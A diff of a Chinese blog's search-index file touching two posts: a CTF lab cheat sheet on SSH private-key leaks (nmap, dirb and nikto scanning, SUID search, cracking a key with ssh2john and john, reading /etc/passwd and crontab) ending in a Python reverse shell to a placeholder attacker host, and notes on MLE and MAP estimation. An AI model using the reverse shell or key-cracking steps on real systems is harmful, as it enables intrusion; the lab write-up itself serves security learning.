@@ -78,13 +78,25 @@
     <url>/2021/12/20/CTF/CTF-1/</url>
     <content><![CDATA[<h1 id="SSH私钥泄露"><a href="#SSH私钥泄露" class="headerlink" title="SSH私钥泄露"></a>SSH私钥泄露</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>对于只是给定一个对应IP地址的靶场机器，我们需要对其进行扫描，探测开放的服务。渗透其实是针对服务的漏洞探测，然后进行相应的数据包发送，获取机器的最高权限。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">挖掘开放服务信息</span></span><br><span class="line">nmap -sV ip</span><br><span class="line"><span class="meta">#</span><span class="bash">探测靶场全部信息</span></span><br><span class="line">nmap -A -v ip</span><br><span class="line"><span class="meta">#</span><span class="bash">探测靶场的操作系统类型与版本</span></span><br><span class="line">nmap -O ip</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">探测服务的隐藏文件</span></span><br><span class="line">dirb http://ip:port</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">挖掘敏感信息</span></span><br><span class="line">nikto -host ip</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查找具有root权限的文件</span></span><br><span class="line">find /-perm -4000 2 &gt; /dev/null</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">通过ssh私钥登录</span></span><br><span class="line">ssh -i id_rsa user@ip</span><br><span class="line"><span class="meta">#</span><span class="bash">解密ssh密钥信息</span></span><br><span class="line">chmod 600 id_isa</span><br><span class="line"><span class="meta">#</span><span class="bash">转换ssh</span></span><br><span class="line">ssh2john id_isa &gt; isacrack</span><br><span class="line"><span class="meta">#</span><span class="bash">利用字典解密</span></span><br><span class="line">zcat ./rockyou.txt.gz | john --pipe --rule isacrack</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看所有用户的列表</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">查看用户组</span></span><br><span class="line">cat /etc/group</span><br><span class="line"><span class="meta">#</span><span class="bash">查看属于某些用户的文件</span></span><br><span class="line">find / -user username</span><br><span class="line"><span class="meta">#</span><span class="bash">查看缓冲文件目录</span></span><br><span class="line">/tmp</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">挖掘定时任务</span></span><br><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">反弹shell</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line">import os, subprocess, socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect(&quot;攻击机IP&quot;, &quot;攻击机监听端口&quot;)</span><br><span class="line">os.dup2(s.fileno(), 0)</span><br><span class="line">os.dup2(s.fileno(), 1)</span><br><span class="line">os.dup2(s.fileno(), 2)</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">攻击机netcat命令</span></span><br><span class="line">nc -lpv port</span><br><span class="line"><span class="meta">#</span><span class="bash">查看占用端口</span></span><br><span class="line">netstat -pantu</span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
       <categories>
         <category>网络安全</category>
@@ -268,7 +280,9 @@
     <content><![CDATA[<p>对概率的诠释有两大学派，一种是频率派，一种是贝叶斯派。<br>$$<br>X_{N\times p}=(X_{1}, X_{2}, \cdots, X_{N})^{T},X_{i}=<br>(X_{i1}, X_{i2}, \cdots, X_{ip})^{T}<br>$$<br>上述表达式中，表示有<em>N</em>个样本，每个样本都是<em>p</em>维向量。其中每个观测都是由$p(x|\theta)$生成的。</p>
 <h1 id="频率派"><a href="#频率派" class="headerlink" title="频率派"></a>频率派</h1><p>$p(x|\theta)$中，$\theta$是一个常量。对于$N$个观测来说，观测集的概率为$p(X|\theta)\mathop{=}\limits_{iid}\prod_{i-1}^{N}p(x_i|\theta)$。</p>
 <p>为了求$\theta$，采用最大对数似然估计MLE方法：<br>$$<br>\theta_{MLE}=\mathop{argmax}\limits_{\theta}\log{p(X|\theta)}\mathop{=}\limits_{iid}\mathop{argmax}\limits_{\theta}\sum_{i=1}^{N}{\log{p(x_i|\theta)}}<br>$$</p>
-<p>其中$iid$即 $ independent &amp; identically\  distributed$，独立同分布。</p>
+<p>其中$iid$即 $ independent &amp; identically;distributed$，独立同分布。</p>
+<span id="more"></span>
+
 <h2 id="贝叶斯派"><a href="#贝叶斯派" class="headerlink" title="贝叶斯派"></a>贝叶斯派</h2><p>贝叶斯派认为$p(x|\theta)$中的$\theta$不是一个常量。这个$\theta$满足一个预设的先验分布$\theta\sim p(\theta)$。</p>
 <p>根据贝叶斯定理依赖观测集参数的后验概率就可以写成:<br>$$<br>p(\theta|X)=\frac{p(X|\theta)\cdot p(\theta)}{p(X)}=\frac{p(X|\theta)\cdot p(\theta)}{\int\limits_{\theta}{p(\theta)d\theta}}<br>$$<br>为了求$\theta$的值，我们使用最大后验概率估计MAP：<br>$$<br>\theta_{MAP}=\mathop{argmax}\limits _{\theta}p(\theta|X)=\mathop{argmax}\limits _{\theta}p(X|\theta)\cdot p(\theta)<br>$$<br>由于分母和$\theta$没有关系。求解这个$\theta$值后计算$\frac{p(X|\theta)\cdot p(\theta)}{\int\limits <em>{\theta}p(X|\theta)\cdot p(\theta)d\theta}$，就得到了参数的后验概率。其中$p(X|\theta)$叫做似然，是模型分布。得到了参数的后验分布后，我们就可以将这个分布用作预测贝叶斯预测：<br>$$<br>p(x</em>{new}|X)=\int\limits <em>{\theta}p(x</em>{new}|\theta)\cdot p(\theta|X)d\theta<br>$$<br>其中积分中的被乘数是模型，乘数是后验分布。</p>
 ]]></content>
